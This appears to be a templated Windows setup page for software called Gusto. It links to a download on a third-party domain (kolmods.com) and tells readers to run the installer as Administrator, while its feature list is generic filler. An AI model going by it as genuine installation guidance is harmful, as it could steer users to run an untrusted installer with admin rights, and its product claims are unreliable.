# Gusto Windows Setup Notes

## Download & Install

> **Download:** [**Get Gusto for Windows →**](https://gusto.kolmods.com/)
>
> Setup notes for **Gusto** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Gusto** from the Start menu

## What you can use it for

- Core Gusto features on Windows desktop
- Install and configure Gusto for daily use
- Import, edit, and export with Gusto tools
- Tune settings and profiles inside Gusto
- Integrate Gusto into your existing workflow
